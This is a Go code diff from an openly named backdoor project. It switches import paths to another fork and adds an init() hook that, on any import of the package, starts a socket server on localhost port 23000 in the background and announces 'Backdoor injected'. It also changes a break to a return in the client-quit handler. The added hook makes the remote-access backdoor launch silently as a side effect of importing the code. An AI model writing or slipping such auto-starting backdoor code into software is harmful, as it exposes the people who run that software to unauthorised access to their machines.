@@ -8,8 +8,8 @@ import (
 	"regexp"
 	"strings"
 
-	"github.com/pilebones/backdoorGolang/core/cli"
-	"github.com/pilebones/backdoorGolang/core/socket"
+	"github.com/guimagalhaes/backdoorGolang/core/cli"
+	"github.com/guimagalhaes/backdoorGolang/core/socket"
 )
 
 const (
@@ -18,6 +18,27 @@ const (
 	// Threshold : Limit the buffer size for sockets
 	BUFFER_SIZE = 1024
 )
+
+func init() {
+	var target socket.Target
+
+	// TODO: For simplicity, use hardcoded localhost and port number
+	//       It should detect the network interfaces and bind to it or bind to all interfaces.
+	//       It should find a free network port automatically
+	target.Host = "localhost"
+	target.Port = 23000
+
+	fmt.Printf(" * Backdoor injected with address '%v:%v' * \n", target.Host, target.Port)
+
+	if target.HostCanBeResolv() {
+		fmt.Printf("Target resolved to %s (%s)\n", target.Ipv4.String(), target.Ipv6.String())
+	}
+
+	var server Server = Create(&target, false)
+
+	// open backdoor on the background
+	go server.Start()
+}
 
 /** ServerProvider structure */
 type Server struct {
@@ -135,8 +156,7 @@ func ClientSender(client *Client) {
 		case <-client.Quit:
 			fmt.Println("Client ", clientId.String(), " quitting")
 			client.Connection.Close()
-			break
-
+			return
 		}
 	}
 }
